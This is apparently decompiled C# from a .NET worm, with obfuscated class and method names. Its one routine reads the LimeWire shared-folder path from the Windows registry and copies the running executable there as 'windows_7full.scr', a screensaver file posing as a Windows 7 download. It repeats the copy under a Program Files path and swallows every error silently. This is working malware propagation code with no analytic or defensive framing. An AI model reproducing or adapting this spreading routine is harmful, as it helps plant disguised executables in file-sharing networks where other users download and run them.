using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns0;

namespace ns1;

[StandardModule]
internal sealed class Class13
{
	private static string string_0 = Conversions.ToString(((ServerComputer)Class1.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\LimeWire\\", "Shared", (object)0));

	public static void smethod_0()
	{
		try
		{
			string text = "windows_7full.scr";
			File.Copy(Application.get_ExecutablePath(), string_0 + text);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			string text2 = "windows_7full.scr";
			File.Copy(Application.get_ExecutablePath(), Interaction.Environ("programfiles\\Shared\\" + text2));
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}
}
